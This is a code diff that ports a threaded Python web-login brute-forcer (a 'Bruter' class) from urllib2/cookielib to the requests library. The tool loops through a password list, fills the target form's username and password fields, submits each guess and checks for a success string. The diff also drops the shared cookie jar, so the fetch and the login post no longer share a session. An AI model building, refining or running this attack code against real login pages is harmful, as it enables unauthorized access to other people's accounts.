@@ -1,6 +1,4 @@
-import urllib2
-import urllib
-import cookielib
+import requests
 import threading
 import sys
 import Queue
@@ -58,12 +56,10 @@ class Bruter(object):
     def web_bruter(self):
         while not self.password_q.empty() and not self.found:
             brute = self.password_q.get().rstrip()
-            jar = cookielib.FileCookieJar("cookies")
-            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
 
-            response = opener.open(target_url)
+            response = requests.get(target_url)
 
-            page = response.read()
+            page = response.text
 
             print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())
 
@@ -77,10 +73,9 @@ class Bruter(object):
             post_tags[username_field] = self.username
             post_tags[password_field] = brute
 
-            login_data = urllib.urlencode(post_tags)
-            login_response = opener.open(target_post, login_data)
+            login_response = requests.post(target_post, data=post_tags)
 
-            login_result = login_response.read()
+            login_result = login_response.text
 
             if success_check in login_result:
                 self.found = True
